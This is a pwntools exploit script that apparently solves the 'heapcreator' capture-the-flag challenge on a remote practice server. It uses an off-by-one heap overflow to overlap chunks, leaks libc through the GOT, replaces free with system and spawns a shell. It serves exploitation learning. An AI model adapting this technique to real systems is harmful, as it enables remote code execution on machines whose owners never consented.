from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 27145)
elf = ELF('../heapcreator')

'''
typedef Struct Heap {
  int size;
  char* str_ptr;
}
'''

# Utility functions
def create(size, content):
  target.sendlineafter('choice :', '1')
  target.sendlineafter('Heap :', str(size))
  target.sendlineafter('heap:', content)
  target.recvuntil('SuccessFul')


def edit(index, content):
  target.sendlineafter('choice :', '2')
  target.sendlineafter('Index :', str(index))
  target.sendlineafter('heap : ', content)
  target.recvuntil('Done !')


def show(index):
  target.sendlineafter('choice :', '3')
  target.sendlineafter('Index :', str(index))


def free(index):
  target.sendlineafter('choice :', '4')
  target.sendlineafter('Index :', str(index))

free_got = elf.got['free']

# chunk0申请了一个0x18的堆块，但拿到了一个size=0x20的堆块，写入数据时只往本堆块写入0x10下
# 个chunk的prev_size域来补足这0x8，这样就可以溢出到下一个chunk的prev_size，然后再溢出1字
# 节，利用off by one修改下一个chunk的size，触发chunk overlap。
create(0x18, 'aaaa')
create(0x10, 'bbbb')

# Off-by-one
edit(0, b'/bin/sh\x00'.ljust(0x18, b'a') + b'\x41')
free(1)

# heap0 -> str0 -> heap1 -> str1
# After free : heap0 -> str0
# After create: heap0 -> str0 -> str1 -> heap1
# 
# Note that the size of str1 is fabricated! So we can overflow to heap 1.
# Write to heap0's str address => 
# |  str1 header  |  str1 body   |  ->  | heap 1 header | head 1 body |
#                 | ------------------------------------| => overwritten by 'a'.
payload = b'a' * 0x20 + p64(0x8) + p64(free_got)
create(0x30, payload)
show(1)

free_addr = u64(target.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc = LibcSearcher('free', free_addr)
libc_base = free_addr - libc.dump('free')
system = libc_base + libc.dump('system')

edit(1, p64(system))
free(0)

target.interactive()